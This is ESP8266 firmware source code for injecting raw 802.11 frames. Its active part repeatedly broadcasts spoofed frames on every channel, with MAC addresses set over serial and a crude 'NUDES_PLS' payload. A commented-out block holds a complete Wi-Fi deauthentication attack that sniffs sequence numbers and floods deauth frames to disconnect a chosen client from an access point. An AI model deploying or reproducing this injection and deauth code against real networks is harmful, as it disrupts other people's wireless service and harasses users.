#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_config.h"
#include "user_interface.h"
#include "driver/uart.h"
#include "espmissingincludes.h"

#define MAX_CHANNEL 13
uint8 channel;

// RTS Packet buffer
uint8_t packet[128] = { 0xb6, 0xb0, 0xf1, 0xdb, 
0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 
 'N', 'U', 'D', 'E' , 'S', '_', 'P', 'L', 'S',
 0x00};                       

#define PACKET_DEST_IND 4
#define BUFFLEN 6
uint8_t buff[BUFFLEN];
int iter = 0;

void ICACHE_FLASH_ATTR uart_rx_task(os_event_t *events) {
    if (events->sig == 0) {
        // Sig 0 is a normal receive. Get how many bytes have been received.
        uint8_t rx_len = (READ_PERI_REG(UART_STATUS(UART0)) >> UART_RXFIFO_CNT_S) & UART_RXFIFO_CNT;
        /*if(rx_len<40) os_printf("new serial, len %d", rx_len);
        if(rx_len == 14) */{
            // Parse the characters, taking any digits as the new timer interval.
            uint8_t rx_char;
            uint8_t ii;
            uint8_t srcnow = 0;
            for (ii=0; ii < rx_len; ii++) {
                rx_char = READ_PERI_REG(UART_FIFO(UART0)) & 0xFF;
                if(ii==0 && rx_char!='D') break;
                else if(ii == 7 && rx_char=='S') {
                    srcnow = 1;
                    continue;
                }
                else if(ii==0 || ii==7) continue;
                iter = ii-1-srcnow;//(iter + ii - 1) % BUFFLEN;
                packet[PACKET_DEST_IND + iter] = rx_char;
                os_printf("iter %d SERIAL %02x %d \n", iter, rx_char, rx_len);
            }
        }

        // Clear the interrupt condition flags and re-enable the receive interrupt.
        WRITE_PERI_REG(UART_INT_CLR(UART0), UART_RXFIFO_FULL_INT_CLR | UART_RXFIFO_TOUT_INT_CLR);
        uart_rx_intr_enable(UART0);
    }
}

void next_channel() {
    channel = channel % MAX_CHANNEL + 1;
}

//bool sender_available = true;

void sender(void *arg) {
    //if(!sender_available) return;
    //sender_available = false;
    const char * pmac = packet + PACKET_DEST_IND;
    const char * pmac1 = packet + PACKET_DEST_IND + 6;
    os_printf("Send status: %d on channel %d dest %02x:%02x:%02x:%02x:%02x:%02x and src %02x:%02x:%02x:%02x:%02x:%02x\n", wifi_send_pkt_freedom(packet, 25, 0), channel, pmac[0], pmac[1], pmac[2], pmac[3], pmac[4], pmac[5], pmac1[0], pmac1[1], pmac1[2], pmac1[3], pmac1[4], pmac1[5]);
    next_channel();
}

/*
void freedom_outside_cb(uint8 status) {
    if(status != 0) {
        os_printf("sender failed wwith status %d", status);
        next_channel();
    }
    sender_available = true;
}*/


static os_timer_t ptimer;

void ICACHE_FLASH_ATTR user_init(void)
{
    uart_init(115200, 115200);
    os_printf("SDK version:%s\n", system_get_sdk_version());
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(1); 
    // not available in sdk 1.3.0
    // wifi_register_send_pkt_freedom_cb(freedom_outside_cb);
    channel = 1;
    wifi_set_channel(channel);
    os_timer_disarm(&ptimer);
    os_timer_setfn(&ptimer, (os_timer_func_t *)sender, NULL);
    os_timer_arm(&ptimer, 1500, 1);
}

/*
#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];
static volatile os_timer_t deauth_timer;
*/
/* Creates a deauth packet.
 * 
 * buf - reference to the data array to write packet to;
 * client - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 * 
 * Returns: size of the packet
 *//*
uint16_t deauth_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;
    
    // Type: deauth
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;
    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // Deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}

// Sends deauth packets.
void deauth(void *arg)
{
    os_printf("\nSending deauth seq_n = %d ...\n", seq_n/0x10);
    // Sequence number is increased by 16, see 802.11
    uint16_t size = deauth_packet(packet_buffer, client, ap, seq_n+0x10);
    wifi_send_pkt_freedom(packet_buffer, size, 0);
}

// Listens communication between AP and client
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len == 128) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    } else {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        int i=0;
        // Check MACs
        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
        for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
        // Update sequence number
        seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
    }
}

void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

void ICACHE_FLASH_ATTR
user_init()
{
    uart_init(115200, 115200);
    os_printf("\n\nSDK version:%s\n", system_get_sdk_version());
    
    // Promiscuous works only with station mode
    wifi_set_opmode(STATION_MODE);
    
    // Set timer for deauth
    os_timer_disarm(&deauth_timer);
    os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
    os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
    
    // Continue to 'sniffer_system_init_done'
    system_init_done_cb(sniffer_system_init_done);
}
*/